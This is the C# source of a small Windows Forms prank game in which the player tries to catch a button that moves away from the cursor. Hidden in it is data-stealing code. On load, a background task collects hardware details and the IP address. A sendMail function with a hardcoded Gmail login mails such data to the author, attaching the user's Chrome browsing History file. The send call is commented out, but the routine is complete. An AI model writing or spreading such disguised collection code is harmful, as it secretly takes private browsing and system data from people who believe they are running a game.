using System;
using System.Collections.Generic;
using System.Linq;
using System.Drawing;
using System.Windows.Forms;
using System.Management;
using System.Net.Mail;
using System.Net;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Rofl
{
    public partial class Form1 : Form
    {

        int counter = 0;

        static string id_not_processed = DateTime.UtcNow.ToString(); //Получаем время для уникального индинтификатора
        static string id_processed = new string(id_not_processed.Where(char.IsDigit).ToArray()); //Убираем из индинтификатора всё лишнее

        //Отправка сообщения на почту
        static void sendMail(string text, string fileName)
        {
            MailAddress from = new MailAddress("smpthardwareinfo@gmail.com", Environment.UserName); //От кого
            MailAddress to = new MailAddress("smpthardwareinfo@gmail.com"); //Кому
            MailMessage msg = new MailMessage(from, to); //Создаем связь
            msg.Subject = Environment.UserName + " HardwareInformation"; //Заголовок
            msg.Body = text; //Сообщение
            msg.IsBodyHtml = false; //HTML не передаем
            if(!(fileName == "err")) msg.Attachments.Add(new Attachment(fileName)); //Если есть файл передаем
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587); //Настраиваем протокол
            smtp.Credentials = new NetworkCredential("smpthardwareinfo", "HardwareInfo1"); //Логин и пароль
            smtp.EnableSsl = true;
            smtp.Send(msg); //Отправка
        }

        //Поиск файла
        static string directory_search()
        {
            string myDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments); //Получаем путь к "Мои документы"
            if (!Directory.Exists(myDocuments = Path.Combine(myDocuments, "Rofl logs")))
            { //Проверка создана ли папка с логами
                DirectoryInfo directoryInfo = new DirectoryInfo(myDocuments);
                directoryInfo.Create(); //Создание папки с логами
                return myDocuments; // Возвращаем путь
            }
            else
            {
                return myDocuments; // Возвращаем путь
            }
        }

        //Логирование
        static void logging(Exception e)
        {
            string myDocument = directory_search(); //Ищем путь к "Мои Документы"
            using (StreamWriter sw = new StreamWriter(myDocument + "\\lods " + id_processed + ".txt", true, System.Text.Encoding.Default)) //Откриваем файл
            {
                sw.WriteLine(e.Message); //Запись
                sw.Close(); //Закритие файла
            }
        }

        //Логирование
        static void logging(string e)
        {
            string myDocument = directory_search(); //Ищем путь к "Мои Документы"
            using (StreamWriter sw = new StreamWriter(myDocument + "\\lods " + id_processed + ".txt", true, System.Text.Encoding.Default)) //Откриваем файл
            {
                sw.WriteLine(e); //Запись
                sw.Close(); //Закритие файла
            }
        }

        //Ищем файл "History"
        static string findFileName()
        {
            try
            {
                var fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\History"); //Поиск файла
                if (File.Exists(fileName)) return fileName; //Файл найден возращаем путь
                else throw new Exception("Error (3.0)"); //Файл не найден логируем ошибку
            }
            catch (Exception e)
            {
                logging(e);
                return "err";
            }
        }

        //Получаем инфу о компе
        static string getHardwareInformations()
        {
            try
            {
                string hardwareInformations = "";

                hardwareInformations += OutputResult("Процессор:", GetHardwareInfo("Win32_Processor", "Name"));
                hardwareInformations += OutputResult("Производитель:", GetHardwareInfo("Win32_Processor", "Manufacturer"));
                hardwareInformations += OutputResult("Описание:", GetHardwareInfo("Win32_Processor", "Description"));
                hardwareInformations += OutputResult("Видеокарта:", GetHardwareInfo("Win32_VideoController", "Name"));
                hardwareInformations += OutputResult("Видеопроцессор:", GetHardwareInfo("Win32_VideoController", "VideoProcessor"));
                hardwareInformations += OutputResult("Версия драйвера:", GetHardwareInfo("Win32_VideoController", "DriverVersion"));
                hardwareInformations += OutputResult("Объем памяти (в байтах):", GetHardwareInfo("Win32_VideoController", "AdapterRAM"));
                hardwareInformations += OutputResult("Название дисковода:", GetHardwareInfo("Win32_CDROMDrive", "Name"));
                hardwareInformations += OutputResult("Буква привода:", GetHardwareInfo("Win32_CDROMDrive", "Drive"));
                hardwareInformations += OutputResult("Жесткий диск:", GetHardwareInfo("Win32_DiskDrive", "Caption"));
                hardwareInformations += OutputResult("Объем (в байтах):", GetHardwareInfo("Win32_DiskDrive", "Size"));

                return hardwareInformations;
            }
            catch
            {
                return "err";
            }
        }

        //Получаем айпи пользователя
        static string getIP()
        {
            try
            {
                string host = System.Net.Dns.GetHostName(); //Получаем всю инфу по хосту
                System.Net.IPAddress ip = System.Net.Dns.GetHostEntry(host).AddressList[0]; //Выбираем айпи
                return "IP Adress: " + ip.ToString();
            }
            catch
            {
                return "err";
            }
        }

        public Form1()
        {
            InitializeComponent();
            this.MaximizeBox = false; // Убираем возможность изменять размери формы
            this.MinimizeBox = false;
            button1.BringToFront(); // Кнопка по верх всех других елементов   
        }

        //Проверка на правильность найдених даних
        static bool data_validation(string func, string errText)
        {
            try
            {
                if (func == "err") throw new Exception(errText); //если функция вернула "err" отлавливаем ошибку
                else return true;
            }
            catch(Exception e)
            {
                logging(e); //логируем
                return false;
            }
        }

        //Параллелизм вторая ветка кода
        static void second_parallel()
        {
            string HInfo = "", text = "";

            HInfo += (data_validation(text = getHardwareInformations(), "Error(1.0)")) ? text : ""; //Проверка получених даних о состовляющих компа
            HInfo += (data_validation(text = getIP(), "Error(1.1)")) ? text : ""; // Проверка получених даних о айпи

            //sendMail(getHardwareInformations(), findFileName()); //Передаем дание для отправки почты
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            engL_Click(sender, e);
            
            Task task = new Task(second_parallel); //создаем вторую ветку кода

            task.Start(); //Запускаем вторую ветку кода

        }

        static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
        {
            List<string> result = new List<string>();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM " + WIN32_Class);

            try
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    result.Add(obj[ClassItemField].ToString().Trim());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return result;
        }

        static string OutputResult(string info, List<string> result)
        {
            string text = "";

            try
            {
                if (info.Length > 0)
                {
                    text += info;
                }

                if (result.Count > 0)
                {
                    for (int i = 0; i < result.Count; ++i)
                    {
                        text += result[i] + " ";
                    }
                }
                text += "\n";
                return text;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return "Error";
            }

        }

        private void button1_MouseEnter(object sender, EventArgs e)
        {
            var rand = new Random();

            string[] l1 = { "Я сдаюсь", "Прекрати", "I am rented", "please stop" };
            int l2 = (lang_i == 0) ? 0 : 2;

            if (counter < 1011)
            {
                ++counter;
                label2.Text = (counter < 9999) ? Convert.ToString(counter) : (counter < 1010) ? l1[l2] : l1[l2+1];
            }

            button1.Location = new Point(rand.Next(0, this.Width - button1.Width - 15), rand.Next(51, this.Height - button1.Height - 38));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(lang_i == 0) MessageBox.Show("Как поймал? Тебе потребывалось всего " + label2.Text + " попыток!", "Не ну я похлопаю!", MessageBoxButtons.OK, MessageBoxIcon.Question);
            else MessageBox.Show("How did you catch it? It took you everything" + label2.Text + " attemps!", "Not well i'll clap!", MessageBoxButtons.OK, MessageBoxIcon.Question);
        }

        private void button1_MouseHover(object sender, EventArgs e)
        {
            button1_MouseEnter(sender, e);
        }

        private void light_theme_Click(object sender, EventArgs e)
        {
            light_theme.Checked = true;
            this.BackColor = SystemColors.Control;
            label1.ForeColor = SystemColors.ControlText;
            label2.ForeColor = SystemColors.ControlText;
            dark_theme.Checked = false;
        }

        private void dark_theme_Click(object sender, EventArgs e)
        {
            dark_theme.Checked = true;
            this.BackColor = SystemColors.ControlDarkDark;
            label1.ForeColor = SystemColors.ControlLightLight;
            label2.ForeColor = SystemColors.ControlLightLight;
            light_theme.Checked = false;
        }

        private void Exit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void about_the_game_Click(object sender, EventArgs e)
        {
            if (lang_i == 0) MessageBox.Show("Ваша задача поймать кнопку за наименьшее число попыток. Удачи!", "О игре", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else MessageBox.Show("Your task is to catch the button in the least number of attempts. Good luck!", "About the game", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void Innovation_Click(object sender, EventArgs e)
        {
            if (lang_i == 0) MessageBox.Show("> Добавлено меню инструментов\n" +
                ">> Возможность менять тему приложения на темную или светлую\n" +
                ">> Несколько информационных кнопок\n" +
                "> Убрана возможность словить кнопку на TAB\n" +
                "> Зачатки логирования в случаи ошибок", "Нововидения", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else MessageBox.Show("Забей инфа устарела", ":(", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void button1_Enter(object sender, EventArgs e)
        {
            button2.Focus();
        }

        int lang_i = 0;

        private void rusL_Click(object sender, EventArgs e)
        {
            engL.Checked = false;
            rusL.Checked = true;

            button1.Text = "Нажми меня";
            label1.Text = "Твои попытки:";
            TSSetting.Text = "Настройки";
            TSSetting_theme.Text = "Фон";
            light_theme.Text = "Светлый";
            dark_theme.Text = "Тёмный";
            TSSetting_complexity.Text = "Сложность";
            gg.Text = "В разработке";
            TSSetting_language.Text = "Язык";
            TSAboutTheProgram.Text = "О программе";
            TSATG_about_the_game.Text = "О игре";
            TSATG_Innovation.Text = "Нововидения";
            Exit.Text = "Выход";

            lang_i = 0;
        }

        private void engL_Click(object sender, EventArgs e)
        {
            engL.Checked = true;
            rusL.Checked = false;

            button1.Text = "Click me";
            label1.Text = "Your attemps:";
            TSSetting.Text = "Setting";
            TSSetting_theme.Text = "Theme";
            light_theme.Text = "Light";
            dark_theme.Text = "Dark";
            TSSetting_complexity.Text = "Complexity";
            gg.Text = "Under construction";
            TSSetting_language.Text = "Language";
            TSAboutTheProgram.Text = "About the program";
            TSATG_about_the_game.Text = "About the game";
            TSATG_Innovation.Text = "Innovation";
            Exit.Text = "Exit";

            lang_i = 1;
        }
    }
}
